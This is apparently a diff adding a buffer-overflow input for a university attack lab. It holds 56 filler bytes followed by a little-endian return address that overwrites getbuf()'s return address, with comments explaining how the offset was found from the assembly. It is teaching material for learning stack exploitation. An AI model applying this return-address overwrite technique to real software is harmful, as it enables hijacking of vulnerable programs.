@@ -1,0 +1,6 @@
+33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 c0 10 40 00 00 00 00 00
+
+# determining (by seeing in the assembly code for getbuf() for %rdi register that points to the begining 
+# of the buffer) that we need to put 56 bytes in the buffer before overwriting the return value 
+# (new return value according to the assignment shold be c0 10 40 00 00 00 00 00 in the little-endian
+# notation). 56 bytes before return we write by arbitrary values
